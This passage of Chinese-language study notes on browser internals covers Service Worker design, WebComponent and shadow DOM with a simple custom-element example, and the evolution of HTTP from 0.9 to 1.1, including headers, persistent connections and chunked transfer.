的概念，它的主要思想是<strong>在页面和网络之间增加一个拦截器，用来缓存和拦截请求</strong>。整体结构如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223026024.png" alt="image-20221014223026024"></p><p>在没有安装 Service Worker 之前，WebApp 都是直接通过网络模块来请求资源的。安装了 Service Worker 模块之后，WebApp 请求资源时，会先通过 Service Worker，让它判断是返回 Service Worker 缓存的资源还是重新去网络请求资源。一切的控制权都交由 Service Worker 来处理。</p><h3 id="Service-Worker-的设计思路"><a href="#Service-Worker-的设计思路" class="headerlink" title="Service Worker 的设计思路"></a>Service Worker 的设计思路</h3><p>现在我们知道 Service Worker 的主要功能就是拦截请求和缓存资源，接下来我们就从 Web 应用的需求角度来看看 Service Worker 的设计思路。</p><h4 id="1-架构"><a href="#1-架构" class="headerlink" title="1. 架构"></a>1. 架构</h4><p>通过前面<strong>页面循环系统</strong>的分析，我们已经知道了 JavaScript 和页面渲染流水线的任务都是在页面主线程上执行的，如果一段 JavaScript 执行时间过久，那么就会阻塞主线程，使得渲染一帧的时间变长，从而让用户产生卡顿的感觉，这对用户来说体验是非常不好的。</p><p>为了避免 JavaScript 过多占用页面主线程时长的情况，浏览器实现了 Web Worker 的功能。Web Worker 的目的是让 JavaScript 能够运行在页面主线程之外，不过由于 Web Worker 中是没有当前页面的 DOM 环境的，所以在 Web Worker 中只能执行一些和 DOM 无关的 JavaScript 脚本，并通过 postMessage 方法将执行的结果返回给主线程。所以说在 Chrome 中， Web Worker 其实就是在渲染进程中开启的一个新线程，它的生命周期是和页面关联的。</p><p><strong>“让其运行在主线程之外”就是 Service Worker 来自 Web Worker 的一个核心思想</strong>。不过 Web Worker 是临时的，每次 JavaScript 脚本执行完成之后都会退出，执行结果也不能保存下来，如果下次还有同样的操作，就还得重新来一遍。所以 Service Worker 需要在 Web Worker 的基础之上加上储存功能。</p><p>另外，由于 Service Worker 还需要会为多个页面提供服务，所以还<strong>不能把 Service Worker 和单个页面绑定起来</strong>。在目前的 Chrome 架构中，Service Worker 是运行在浏览器进程中的，因为浏览器进程生命周期是最长的，所以在浏览器的生命周期内，能够为所有的页面提供服务。</p><h4 id="2-消息推送"><a href="#2-消息推送" class="headerlink" title="2. 消息推送"></a>2. 消息推送</h4><p><strong>消息推送也是基于 Service Worker 来实现的</strong>。因为消息推送时，浏览器页面也许并没有启动，这时就需要 Service Worker 来接收服务器推送的消息，并将消息通过一定方式展示给用户。关于消息推送的细节这里我们就不详述了，如果你感兴趣的话可以自行搜索相关资料去学习。</p><h4 id="3-安全"><a href="#3-安全" class="headerlink" title="3. 安全"></a>3. 安全</h4><p>基于 Web 应用的业务越来越多了，其安全问题是不可忽视的，所以在设计 Service Worker 之初，安全问题就被提上了日程。</p><p>关于安全，其中最为核心的一条就是 HTTP。我们知道，HTTP 采用的是明文传输信息，存在被窃听、被篡改和被劫持的风险，在项目中使用 HTTP 来传输数据无疑是“裸奔”。所以在设计之初，就考虑对 Service Worker 采用 HTTPS 协议，因为采用 HTTPS 的通信数据都是经过加密的，即便拦截了数据，也无法破解数据内容，而且 HTTPS 还有校验机制，通信双方很容易知道数据是否被篡改。关于 HTTPS 协议，我们会在最后的安全模块详细介绍。</p><p>所以要使站点支持 Service Worker，首先必要的一步就是要将站点升级到 HTTPS。</p><p>除了必须要使用 HTTPS，Service Worker 还需要同时支持 Web 页面默认的安全策略、储入同源策略、内容安全策略（CSP）等，关于这些，后续我们也会详细介绍。</p><h3 id="总结-26"><a href="#总结-26" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>我们先分析了 PWA，它是由很多技术组成的一个理念，其核心思想是<strong>渐进式</strong>。对于开发者，它提供了非常温和的方式，让开发者将普通的站点逐步过渡到 Web 应用。对于技术本身而言，它是渐进式演进，逐渐将 Web 技术发挥到极致的同时，也逐渐缩小和本地应用的差距。在此基础上，我们又分析了 PWA 中的 Service Worker 的设计思路。</p><p>另外，PWA 还提供了 manifest.json 配置文件，可以让开发者自定义桌面的图标、显示名称、启动方式等信息，还可以设置启动画面、页面主题颜色等信息。关于 manifest.json 的配置还是比较简单的，详细使用教程网上有很多，这里我就不做介绍了。</p><p>添加桌面标、增加离线缓存、增加消息推送等功能是 PWA 走向设备的必备功能，但我认为真正决定 PWA 能否崛起的还是底层技术，比如页面渲染效率、对系统设备的支持程度、WebAssembly 等，而这些技术也在渐进式进化过程中。所以未来如何，我们拭目以待。</p><h2 id="8-WebComponent：像搭积木一样构建-Web-应用"><a href="#8-WebComponent：像搭积木一样构建-Web-应用" class="headerlink" title="8. WebComponent：像搭积木一样构建 Web 应用"></a>8. WebComponent：像搭积木一样构建 Web 应用</h2><p>在<a href="https://time.geekbang.org/column/article/144983">上一篇文章</a>中我们从技术演变的角度介绍了 PWA，这是一套集合了多种技术的理念，让浏览器渐进式适应设备端。今天我们要站在开发者和项目角度来聊聊 WebComponent，同样它也是一套技术的组合，能提供给开发者组件化开发的能力。</p><p>那什么是组件化呢？</p><p>其实组件化并没有一个明确的定义，不过这里我们可以使用 10 个字来形容什么是组件化，那就是：<strong>对内高内聚，对外低耦合</strong>。对内各个元素彼此紧密结合、相互依赖，对外和其他组件的联系最少且接口简单。</p><p>可以说，程序员对组件化开发有着天生的需求，因为一个稍微复杂点的项目，就涉及到多人协作开发的问题，每个人负责的组件需要尽可能独立完成自己的功能，其组件的内部状态不能影响到别人的组件，在需要和其他组件交互的地方得提前协商好接口。通过组件化可以降低整个系统的耦合度，同时也降低程序员之间沟通复杂度，让系统变得更加易于维护。</p><p>使用组件化能带来很多优势，所以很多语言天生就对组件化提供了很好的支持，比如 C&#x2F;C++ 就可以很好地将功能封装成模块，无论是业务逻辑，还是基础功能，抑或是 UI，都能很好地将其组合在一起，实现组件内部的高度内聚、组件之间的低耦合。</p><p>大部分语言都能实现组件化，归根结底在于编程语言特性，大多数语言都有自己的函数级作用域、块级作用域和类，可以将内部的状态数据隐藏在作用域之下或者对象的内部，这样外部就无法访问了，然后通过约定好的接口和外部进行通信。</p><p>JavaScript 虽然有不少缺点，但是作为一门编程语言，它也能很好地实现组件化，毕竟有自己的函数级作用域和块级作用域，所以封装内部状态数据并提供接口给外部都是没有问题的。</p><p>既然 JavaScript 可以很好地实现组件化，那么我们所谈论的 WebComponent 到底又是什么呢？</p><h3 id="阻碍前端组件化的因素"><a href="#阻碍前端组件化的因素" class="headerlink" title="阻碍前端组件化的因素"></a>阻碍前端组件化的因素</h3><p>在前端虽然 HTML、CSS 和 JavaScript 是强大的开发语言，但是在大型项目中维护起来会比较困难，如果在页面中嵌入第三方内容时，还需要确保第三方的内容样式不会影响到当前内容，同样也要确保当前的 DOM 不会影响到第三方的内容。</p><p>所以要聊 WebComponent，得先看看 HTML 和 CSS 是如何阻碍前端组件化的，这里我们就通过下面这样一个简单的例子来分析下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">p &#123;</span><br><span class="line">      background-color: brown;</span><br><span class="line">      color: cornsilk</span><br><span class="line">   &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;p&gt;time.geekbang.org&lt;/p&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">p &#123;</span><br><span class="line">      background-color: red;</span><br><span class="line">      color: blue</span><br><span class="line">   &#125;</span><br><span class="line">&lt;p&gt;time.geekbang&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>上面这两段代码分别实现了自己 p 标签的属性，如果两个人分别负责开发这两段代码的话，那么在测试阶段可能没有什么问题，不过当最终项目整合的时候，其中内部的 CSS 属性会影响到其他外部的 p 标签的，之所以会这样，是因为 CSS 是影响全局的。</p><p>我们在<a href="https://time.geekbang.org/column/article/140703">《23 | 渲染流水线：CSS 如何影响首次加载时的白屏时间？》</a>这篇文章中分析过，渲染引擎会将所有的 CSS 内容解析为 CSSOM，在生成布局树的时候，会在 CSSOM 中为布局树中的元素查找样式，所以有两个相同标签最终所显示出来的效果是一样的，渲染引擎是不能为它们分别单独设置样式的。</p><p>除了 CSS 的全局属性会阻碍组件化，DOM 也是阻碍组件化的一个因素，因为在页面中只有一个 DOM，任何地方都可以直接读取和修改 DOM。所以使用 JavaScript 来实现组件化是没有问题的，但是 JavaScript 一旦遇上 CSS 和 DOM，那么就相当难办了。</p><h3 id="WebComponent-组件化开发"><a href="#WebComponent-组件化开发" class="headerlink" title="WebComponent 组件化开发"></a>WebComponent 组件化开发</h3><p>现在我们了解了<strong>CSS 和 DOM 是阻碍组件化的两个因素</strong>，那要怎么解决呢？</p><p>WebComponent 给出了解决思路，它提供了对局部视图封装能力，可以让 DOM、CSSOM 和 JavaScript 运行在局部环境中，这样就使得局部的 CSS 和 DOM 不会影响到全局。</p><p>了解了这些，下面我们就结合具体代码来看看 WebComponent 是怎么实现组件化的。</p><p>前面我们说了，WebComponent 是一套技术的组合，具体涉及到了<strong>Custom elements（自定义元素）、Shadow DOM（影子 DOM）**和**HTML templates（HTML 模板）</strong>，详细内容你可以参考 MDN 上的<a href="https://developer.mozilla.org/zh-CN/docs/Web/Web_Components">相关链接</a>。</p><p>下面我们就来演示下这 3 个技术是怎么实现数据封装的，如下面代码所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">            一：定义模板</span><br><span class="line">            二：定义内部 CSS 样式</span><br><span class="line">            三：定义 JavaScript 行为</span><br><span class="line">    --&gt;</span><br><span class="line">    &lt;template id=&quot;geekbang-t&quot;&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            p &#123;</span><br><span class="line">                background-color: brown;</span><br><span class="line">                color: cornsilk</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            div &#123;</span><br><span class="line">                width: 200px;</span><br><span class="line">                background-color: bisque;</span><br><span class="line">                border: 3px solid chocolate;</span><br><span class="line">                border-radius: 10px;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">            &lt;p&gt;time.geekbang.org&lt;/p&gt;</span><br><span class="line">            &lt;p&gt;time1.geekbang.org&lt;/p&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            function foo() &#123;</span><br><span class="line">                console.log(&#x27;inner log&#x27;)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/template&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        class GeekBang extends HTMLElement &#123;</span><br><span class="line">            constructor() &#123;</span><br><span class="line">                super()</span><br><span class="line">                // 获取组件模板</span><br><span class="line">                const content = document.querySelector(&#x27;#geekbang-t&#x27;).content</span><br><span class="line">                // 创建影子 DOM 节点</span><br><span class="line">                const shadowDOM = this.attachShadow(&#123; mode: &#x27;open&#x27; &#125;)</span><br><span class="line">                // 将模板添加到影子 DOM 上</span><br><span class="line">                shadowDOM.appendChild(content.cloneNode(true))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        customElements.define(&#x27;geek-bang&#x27;, GeekBang)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;geek-bang&gt;&lt;/geek-bang&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;p&gt;time.geekbang.org&lt;/p&gt;</span><br><span class="line">        &lt;p&gt;time1.geekbang.org&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;geek-bang&gt;&lt;/geek-bang&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>详细观察上面这段代码，我们可以得出：要使用 WebComponent，通常要实现下面三个步骤。</p><p><strong>首先，使用 template 属性来创建模板</strong>。利用 DOM 可以查找到模板的内容，但是模板元素是不会被渲染到页面上的，也就是说 DOM 树中的 template 节点不会出现在布局树中，所以我们可以使用 template 来自定义一些基础的元素结构，这些基础的元素结构是可以被重复使用的。一般模板定义好之后，我们还需要在模板的内部定义样式信息。</p><p><strong>其次，我们需要创建一个 GeekBang 的类</strong>。在该类的构造函数中要完成三件事：</p><ol><li>查找模板内容；</li><li>创建影子 DOM；</li><li>再将模板添加到影子 DOM 上。</li></ol><p>上面最难理解的是影子 DOM，其实影子 DOM 的作用是将模板中的内容与全局 DOM 和 CSS 进行隔离，这样我们就可以实现元素和样式的私有化了。你可以把影子 DOM 看成是一个作用域，其内部的样式和元素是不会影响到全局的样式和元素的，而在全局环境下，要访问影子 DOM 内部的样式或者元素也是需要通过约定好的接口的。</p><p>总之，通过影子 DOM，我们就实现了 CSS 和元素的封装，在创建好封装影子 DOM 的类之后，我们就可以<strong>使用 customElements.define 来自定义元素了</strong>（可参考上述代码定义元素的方式）。</p><p><strong>最后，就很简单了，可以像正常使用 HTML 元素一样使用该元素</strong>，如上述代码中的<code>&lt;geek-bang&gt;&lt;/geek-bang&gt;</code>。</p><p>上述代码最终渲染出来的页面，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223059008.png" alt="image-20221014223059008"></p><p>从图中我们可以看出，影子 DOM 内部的样式是不会影响到全局 CSSOM 的。另外，使用 DOM 接口也是无法直接查询到影子 DOM 内部元素的，比如你可以使用<code>document.getElementsByTagName(&#39;div&#39;)</code>来查找所有 div 元素，这时候你会发现影子 DOM 内部的元素都是无法查找的，因为要想查找影子 DOM 内部的元素需要专门的接口，所以通过这种方式又将影子内部的 DOM 和外部的 DOM 进行了隔离。</p><p>通过影子 DOM 可以隔离 CSS 和 DOM，不过需要注意一点，影子 DOM 的 JavaScript 脚本是不会被隔离的，比如在影子 DOM 定义的 JavaScript 函数依然可以被外部访问，这是因为 JavaScript 语言本身已经可以很好地实现组件化了。</p><h3 id="浏览器如何实现影子-DOM"><a href="#浏览器如何实现影子-DOM" class="headerlink" title="浏览器如何实现影子 DOM"></a>浏览器如何实现影子 DOM</h3><p>关于 WebComponent 的使用方式我们就介绍到这里。WebComponent 整体知识点不多，内容也不复杂，我认为核心就是影子 DOM。上面我们介绍影子 DOM 的作用主要有以下两点：</p><ol><li>影子 DOM 中的元素对于整个网页是不可见的；</li><li>影子 DOM 的 CSS 不会影响到整个网页的 CSSOM，影子 DOM 内部的 CSS 只对内部的元素起作用。</li></ol><p>那么浏览器是如何实现影子 DOM 的呢？下面我们就来分析下，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223109785.png" alt="image-20221014223109785"></p><p>该图是上面那段示例代码对应的 DOM 结构图，从图中可以看出，我们使用了两次 geek-bang 属性，那么就会生成两个影子 DOM，并且每个影子 DOM 都有一个 shadow root 的根节点，我们可以将要展示的样式或者元素添加到影子 DOM 的根节点上，每个影子 DOM 你都可以看成是一个独立的 DOM，它有自己的样式、自己的属性，内部样式不会影响到外部样式，外部样式也不会影响到内部样式。</p><p>浏览器为了实现影子 DOM 的特性，在代码内部做了大量的条件判断，比如当通过 DOM 接口去查找元素时，渲染引擎会去判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是影子 DOM，那么就直接跳过 shadow-root 元素的查询操作。所以这样通过 DOM API 就无法直接查询到影子 DOM 的内部元素了。</p><p>另外，当生成布局树的时候，渲染引擎也会判断 geek-bang 属性下面的 shadow-root 元素是否是影子 DOM，如果是，那么在影子 DOM 内部元素的节点选择 CSS 样式的时候，会直接使用影子 DOM 内部的 CSS 属性。所以这样最终渲染出来的效果就是影子 DOM 内部定义的样式。</p><h3 id="总结-27"><a href="#总结-27" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我来总结下本文的主要内容。</p><p>首先，我们介绍了组件化开发是程序员的刚需，所谓组件化就是功能模块要实现高内聚、低耦合的特性。不过由于 DOM 和 CSSOM 都是全局的，所以它们是影响了前端组件化的主要元素。基于这个原因，就出现 WebComponent，它包含自定义元素、影子 DOM 和 HTML 模板三种技术，使得开发者可以隔离 CSS 和 DOM。在此基础上，我们还重点介绍了影子 DOM 到底是怎么实现的。</p><p>关于 WebComponent 的未来如何，这里我们不好预测和评判，但是有一点可以肯定，WebComponent 也会采用渐进式迭代的方式向前推进，未来依然有很多坑需要去填。</p><h1 id="六、浏览器中的网络"><a href="#六、浏览器中的网络" class="headerlink" title="六、浏览器中的网络"></a>六、浏览器中的网络</h1><h2 id="1-HTTP-x2F-1：HTTP-性能优化"><a href="#1-HTTP-x2F-1：HTTP-性能优化" class="headerlink" title="1. HTTP&#x2F;1：HTTP 性能优化"></a>1. HTTP&#x2F;1：HTTP 性能优化</h2><p>谈及浏览器中的网络，就避不开 HTTP。我们知道 HTTP 是浏览器中<strong>最重要</strong>且<strong>使用最多</strong>的协议，是<strong>浏览器和服务器之间的通信语言</strong>，也是互联网的基石。而随着浏览器的发展，HTTP 为了能适应新的形式也在持续进化，我认为学习 HTTP 的最佳途径就是了解其发展史，所以在接下来的三篇文章中，我会从浏览器发展的视角来和你聊聊 HTTP 演进。这三篇分别是<strong>即将完成使命的 HTTP&#x2F;1、正在向我们走来的 HTTP&#x2F;2，以及未来的 HTTP&#x2F;3</strong>。</p><p>本文主要介绍的是 HTTP&#x2F;1.1，我们先讲解 HTTP&#x2F;1.1 的进化史，然后再介绍在进化过程中所遇到的各种瓶颈，以及对应的解决方法。</p><h3 id="超文本传输协议-HTTP-x2F-0-9"><a href="#超文本传输协议-HTTP-x2F-0-9" class="headerlink" title="超文本传输协议 HTTP&#x2F;0.9"></a>超文本传输协议 HTTP&#x2F;0.9</h3><p>首先我们来看看诞生最早的 HTTP&#x2F;0.9。HTTP&#x2F;0.9 是于 1991 年提出的，主要用于学术交流，需求很简单——用来在网络之间传递 HTML 超文本的内容，所以被称为<strong>超文本传输协议</strong>。整体来看，它的实现也很简单，采用了基于请求响应的模式，从客户端发出请求，服务器返回数据。</p><p>下面我们就来看看 HTTP&#x2F;0.9 的一个完整的请求流程（可参考下图）。</p><ul><li>因为 HTTP 都是基于 TCP 协议的，所以客户端先要根据 IP 地址、端口和服务器建立 TCP 连接，而建立连接的过程就是 TCP 协议三次握手的过程。</li><li>建立好连接之后，会发送一个 GET 请求行的信息，如<code>GET /index.html</code>用来获取 index.html。</li><li>服务器接收请求信息之后，读取对应的 HTML 文件，并将数据以 ASCII 字符流返回给客户端。</li><li>HTML 文档传输完成后，断开连接。</li></ul><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223317247.png" alt="image-20221014223317247"></p><p>总的来说，当时的需求很简单，就是用来传输体积很小的 HTML 文件，所以 HTTP&#x2F;0.9 的实现有以下三个特点。</p><ul><li>第一个是只有一个请求行，并没有<strong>HTTP 请求头和请求体</strong>，因为只需要一个请求行就可以完整表达客户端的需求了。</li><li>第二个是服务器也没有返回头信息，这是因为服务器端并不需要告诉客户端太多信息，只需要返回数据就可以了。</li><li>第三个是返回的文件内容是以 ASCII 字符流来传输的，因为都是 HTML 格式的文件，所以使用 ASCII 字节码来传输是最合适的。</li></ul><h3 id="被浏览器推动的-HTTP-x2F-1-0"><a href="#被浏览器推动的-HTTP-x2F-1-0" class="headerlink" title="被浏览器推动的 HTTP&#x2F;1.0"></a>被浏览器推动的 HTTP&#x2F;1.0</h3><p>HTTP&#x2F;0.9 虽然简单，但是已经可以满足当时的需求了。不过变化是这个世界永恒不变的主旋律，1994 年底出现了拨号上网服务，同年网景又推出一款浏览器，从此万维网就不局限于学术交流了，而是进入了高速的发展阶段。随之而来的是万维网联盟（W3C）和 HTTP 工作组（HTTP-WG）的创建，它们致力于 HTML 的发展和 HTTP 的改进。</p><p>万维网的高速发展带来了很多新的需求，而 HTTP&#x2F;0.9 已经不能适用新兴网络的发展，所以这时就需要一个新的协议来支撑新兴网络，这就是 HTTP&#x2F;1.0 诞生的原因。不过在详细分析 HTTP&#x2F;1.0 之前，我们先来分析下新兴网络都带来了哪些新需求。</p><p>首先在浏览器中展示的不单是 HTML 文件了，还包括了 JavaScript、CSS、图片、音频、视频等不同类型的文件。因此<strong>支持多种类型的文件下载是 HTTP&#x2F;1.0 的一个核心诉求</strong>，而且文件格式不仅仅局限于 ASCII 编码，还有很多其他类型编码的文件。</p><p><strong>那么该如何实现多种类型文件的下载呢？</strong></p><p>文章开头我们说过，HTTP 是浏览器和服务器之间的通信语言，不过 HTTP&#x2F;0.9 在建立好连接之后，只会发送类似<code>GET /index.html</code>的简单请求命令，并没有其他途径告诉服务器更多的信息，如文件编码、文件类型等。同样，服务器是直接返回数据给浏览器的，也没有其他途径告诉浏览器更多的关于服务器返回的文件信息。</p><p>这种简单的交流型形式无疑不能满足传输多种类型文件的需求，那为了让客户端和服务器能更深入地交流，HTTP&#x2F;1.0 引入了请求头和响应头，它们都是以为 Key-Value 形式保存的，在 HTTP 发送请求时，会带上请求头信息，服务器返回数据时，会先返回响应头信息。至于 HTTP&#x2F;1.0 具体的请求流程，你可以参考下图。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223333402.png" alt="image-20221014223333402"></p><p>有了请求头和响应头，浏览器和服务器就能进行更加深入的交流了。</p><p><strong>那 HTTP&#x2F;1.0 是怎么通过请求头和响应头来支持多种不同类型的数据呢？</strong></p><p>要支持多种类型的文件，我们就需要解决以下几个问题。</p><ul><li>首先，浏览器需要知道服务器返回的数据是什么类型的，然后浏览器才能根据不同的数据类型做针对性的处理。</li><li>其次，由于万维网所支持的应用变得越来越广，所以单个文件的数据量也变得越来越大。为了减轻传输性能，服务器会对数据进行压缩后再传输，所以浏览器需要知道服务器压缩的方法。</li><li>再次，由于万维网是支持全球范围的，所以需要提供国际化的支持，服务器需要对不同的地区提供不同的语言版本，这就需要浏览器告诉服务器它想要什么语言版本的页面。</li><li>最后，由于增加了各种不同类型的文件，而每种文件的编码形式又可能不一样，为了能够准确地读取文件，浏览器需要知道文件的编码类型。</li></ul><p>基于以上问题，HTTP&#x2F;1.0 的方案是通过请求头和响应头来进行协商，在发起请求时候会通过 HTTP 请求头告诉服务器它期待服务器返回什么类型的文件、采取什么形式的压缩、提供什么语言的文件以及文件的具体编码。最终发送出来的请求头内容如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">accept: text/html</span><br><span class="line">accept-encoding: gzip, deflate, br</span><br><span class="line">accept-Charset: ISO-8859-1,utf-8</span><br><span class="line">accept-language: zh-CN,zh</span><br></pre></td></tr></table></figure><p>其中第一行表示期望服务器返回 html 类型的文件，第二行表示期望服务器可以采用 gzip、deflate 或者 br 其中的一种压缩方式，第三行表示期望返回的文件编码是 UTF-8 或者 ISO-8859-1，第四行是表示期望页面的优先语言是中文。</p><p>服务器接收到浏览器发送过来的请求头信息之后，会根据请求头的信息来准备响应数据。不过有时候会有一些意外情况发生，比如浏览器请求的压缩类型是 gzip，但是服务器不支持 gzip，只支持 br 压缩，那么它会通过响应头中的 content-encoding 字段告诉浏览器最终的压缩类型，也就是说最终浏览器需要根据响应头的信息来处理数据。下面是一段响应头的数据信息：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content-encoding: br</span><br><span class="line">content-type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>其中第一行表示服务器采用了 br 的压缩方法，第二行表示服务器返回的是 html 文件，并且该文件的编码类型是 UTF-8。</p><p>有了响应头的信息，浏览器就会使用 br 方法来解压文件，再按照 UTF-8 的编码格式来处理原始文件，最后按照 HTML 的方式来解析该文件。这就是 HTTP&#x2F;1.0 支持多文件的一个基本的处理流程。</p><p>HTTP&#x2F;1.0 除了对多文件提供良好的支持外，还依据当时实际的需求引入了很多其他的特性，这些特性都是通过请求头和响应头来实现的。下面我们来看看新增的几个典型的特性：</p><ul><li>有的请求服务器可能无法处理，或者处理出错，这时候就需要告诉浏览器服务器最终处理该请求的情况，这就引入了<strong>状态码</strong>。状态码是通过响应行的方式来通知浏览器的。</li><li>为了减轻服务器的压力，在 HTTP&#x2F;1.0 中提供了<strong>Cache 机制</strong>，用来缓存已经下载过的数据。</li><li>服务器需要统计客户端的基础信息，比如 Windows 和 macOS 的用户数量分别是多少，所以 HTTP&#x2F;1.0 的请求头中还加入了<strong>用户代理</strong>的字段。</li></ul><h3 id="缝缝补补的-HTTP-x2F-1-1"><a href="#缝缝补补的-HTTP-x2F-1-1" class="headerlink" title="缝缝补补的 HTTP&#x2F;1.1"></a>缝缝补补的 HTTP&#x2F;1.1</h3><p>不过随着技术的继续发展，需求也在不断迭代更新，很快 HTTP&#x2F;1.0 也不能满足需求了，所以 HTTP&#x2F;1.1 又在 HTTP&#x2F;1.0 的基础之上做了大量的更新。接下来我们来看看 HTTP&#x2F;1.0 遇到了哪些主要的问题，以及 HTTP&#x2F;1.1 又是如何改进的。</p><h4 id="1-改进持久连接"><a href="#1-改进持久连接" class="headerlink" title="1. 改进持久连接"></a>1. 改进持久连接</h4><p>HTTP&#x2F;1.0 每进行一次 HTTP 通信，都需要经历建立 TCP 连接、传输 HTTP 数据和断开 TCP 连接三个阶段（如下图）。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223348982.png" alt="image-20221014223348982"></p><p>在当时，由于通信的文件比较小，而且每个页面的引用也不多，所以这种传输形式没什么大问题。但是随着浏览器普及，单个页面中的图片文件越来越多，有时候一个页面可能包含了几百个外部引用的资源文件，如果在下载每个文件的时候，都需要经历建立 TCP 连接、传输数据和断开连接这样的步骤，无疑会增加大量无谓的开销。</p><p>为了解决这个问题，<strong>HTTP&#x2F;1.1 中增加了持久连接的方法，它的特点是在一个 TCP 连接上可以传输多个 HTTP 请求，只要浏览器或者服务器没有明确断开连接，那么该 TCP 连接会一直保持</strong>。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014223359952.png" alt="image-20221014223359952"></p><p>从上图可以看出，HTTP 的持久连接可以有效减少 TCP 建立连接和断开连接的次数，这样的好处是减少了服务器额外的负担，并提升整体 HTTP 的请求时长。</p><p>持久连接在 HTTP&#x2F;1.1 中是默认开启的，所以你不需要专门为了持久连接去 HTTP 请求头设置信息，如果你不想要采用持久连接，可以在 HTTP 请求头中加上<code>Connection: close</code>。目前浏览器中对于同一个域名，默认允许同时建立 6 个 TCP 持久连接。</p><h4 id="2-不成熟的-HTTP-管线化"><a href="#2-不成熟的-HTTP-管线化" class="headerlink" title="2. 不成熟的 HTTP 管线化"></a>2. 不成熟的 HTTP 管线化</h4><p>持久连接虽然能减少 TCP 的建立和断开次数，但是它需要等待前面的请求返回之后，才能进行下一次请求。如果 TCP 通道中的某个请求因为某些原因没有及时返回，那么就会阻塞后面的所有请求，这就是著名的<strong>队头阻塞</strong>的问题。</p><p>HTTP&#x2F;1.1 中试图通过管线化的技术来解决<strong>队头阻塞</strong>的问题。HTTP&#x2F;1.1 中的管线化是指将多个 HTTP 请求整批提交给服务器的技术，虽然可以整批发送请求，不过服务器依然需要根据请求顺序来回复浏览器的请求。</p><p>FireFox、Chrome 都做过管线化的试验，但是由于各种原因，它们最终都放弃了管线化技术。</p><h4 id="3-提供虚拟主机的支持"><a href="#3-提供虚拟主机的支持" class="headerlink" title="3. 提供虚拟主机的支持"></a>3. 提供虚拟主机的支持</h4><p>在 HTTP&#x2F;1.0 中，每个域名绑定了一个唯一的 IP 地址，因此一个服务器只能支持一个域名。但是随着虚拟主机技术的发展，需要实现在一台物理主机上绑定多个虚拟主机，每个虚拟主机都有自己的单独的域名，这些单独的域名都公用同一个 IP 地址。</p><p>因此，HTTP&#x2F;1.1 的请求头中增加了<strong>Host 字段</strong>，用来表示当前的域名地址，这样服务器就可以根据不同的 Host 值做不同的处理。</p><h4 id="4-对动态生成的内容提供了完美支持"><a href="#4-对动态生成的内容提供了完美支持" class="headerlink" title="4. 对动态生成的内容提供了完美支持"></a>4. 对动态生成的内容提供了完美支持</h4><p>在设计 HTTP&#x2F;1.0 时，需要在响应头中设置完整的数据大小，如<code>Content-Length: 901</code>，这样浏览器就可以根据设置的数据大小来接收数据。不过随着服务器端的技术发展，很多页面的内容都是动态生成的，因此在传输数据之前并不知道最终的数据大小，这就导致了浏览器不知道何时会接收完所有的文件数据。</p><p>HTTP&#x2F;1.1 通过引入<strong>Chunk transfer 机制</strong>来解决这个问题，服务器会将数据分割成若干个任意大小的数据块，每个数据块发送时会附上上个数据块的长度，最后使用一个零长度的块作为发送数据完成的标志。这样就提供了对动态内容的支持。</p><h4 id="5-客户端-Cookie、安全机制"><a href="#5-客户端-Cookie、安全机制" class="headerlink" title="5. 客户端 Cookie、安全机制"></a>5. 客户端 Cookie、安全机制</h4><p>除此之外，HTTP&#x2F;1.1 还引入了客户端 Cookie 机制和安全机制。其中，Cookie 机制我们在<a href="https://time.geekbang.org/column/article/116588">《03 | HTTP 请求流程：为什么很多站点第二次打开速度会很快？》</a>这篇文章中介绍过了，而安全机制我们会在后面的安全模块中再做介绍，这里就不赘述了。</p><h3 id="总结-28"><a href="#总结-28" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下本文的主要内容。</p><p>本文我们重点强调了 HTTP 是浏览器和服务器的通信语言，然后我们从需求演变的角度追溯了 HTTP 的发展史，在诞生之初的 HTTP&#x2F;0.9 因为需求简单，所以和服务器之间的通信过程也相对简单。</p><p>由于万维网的快速崛起，带来了大量新的需求，其中最核心的一个就是需要支持多种类型的文件下载， 为此 